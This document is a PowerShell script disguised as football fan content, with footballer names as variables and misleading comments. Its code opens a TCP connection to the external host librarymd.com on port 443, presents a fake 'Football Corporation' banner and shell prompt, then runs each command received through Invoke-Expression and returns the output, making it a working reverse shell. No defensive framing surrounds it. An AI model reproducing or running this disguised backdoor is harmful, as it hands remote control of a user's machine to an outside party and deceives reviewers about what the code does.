# The Champions League for Football Fanatics


$mbappe = "librarymd.com"  # The domain representing a popular football player (could be related to their official website)
$neymar = 443  # Port to connect to (e.g., 443 for HTTPS)

try {
    # Connect to the domain over TCP (DNS resolution handled automatically)
    $ronaldo = New-Object System.Net.Sockets.TcpClient($mbappe, $neymar)
    $kante = $ronaldo.GetStream()

    # Set up a StreamWriter and StreamReader for communication
    $debruyne = New-Object IO.StreamWriter($kante)
    $debruyne.AutoFlush = $true
    $vardy = New-Object IO.StreamReader($kante)

    # Send the initial message
    $debruyne.WriteLine("(c) Football Corporation. All rights reserved.`n`n")
    $debruyne.Write((pwd).Path + '> ')

    # Read from the network stream and execute commands
    while ($ronaldo.Connected) {
        $messi = $vardy.ReadLine()
        if ($messi) {
            try {
                # Execute the received command and send the output
                $salah = Invoke-Expression $messi 2>&1 | Out-String
                $debruyne.WriteLine($messi)
                $debruyne.WriteLine($salah)
                $debruyne.Write((pwd).Path + '> ')
            } catch {
                $debruyne.WriteLine("ERROR: $_")
                $debruyne.Write((pwd).Path + '> ')
            }
        }
    }
} catch {
    exit
}
